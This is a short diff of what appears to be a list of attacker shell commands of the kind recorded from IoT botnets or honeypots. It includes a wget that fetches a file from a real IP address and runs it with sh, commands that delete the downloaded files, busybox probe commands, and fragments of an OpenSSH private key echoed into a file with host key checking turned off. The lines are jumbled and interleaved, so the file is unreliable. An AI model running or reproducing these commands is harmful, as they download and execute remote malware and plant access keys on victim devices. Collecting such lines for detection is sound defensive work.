@@ -22,6 +22,7 @@ rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
+/bin/busybox TOKEN
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
 AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
 Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
@@ -52,7 +53,6 @@ ping; sh
 rm -rf ok
 rm -rf ok.1
 /bin/busybox cat /proc/self/exe || cat /proc/self/exe
-/bin/busybox TOKEN
 za
 zalee
 echo SHELL_TEST
